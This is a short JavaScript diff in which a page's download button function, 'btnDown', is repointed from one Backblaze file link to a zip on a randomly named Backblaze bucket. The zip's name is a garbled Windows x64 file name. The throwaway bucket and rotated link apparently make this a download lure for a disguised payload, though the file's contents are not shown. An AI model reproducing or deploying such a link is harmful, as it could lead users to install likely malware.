@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_z64b9c51816b9c17a9a8a0311_f107d5eb7bec670e2_d20250906_m044811_c005_v0501011_t0052_u01757134091142')
+    window.open('https://jasgsdhnayutjzg.s3.us-east-005.backblazeb2.com/Vicce_x64_win7-11_Quioaydiiek_v412001.23.zip')
                 }
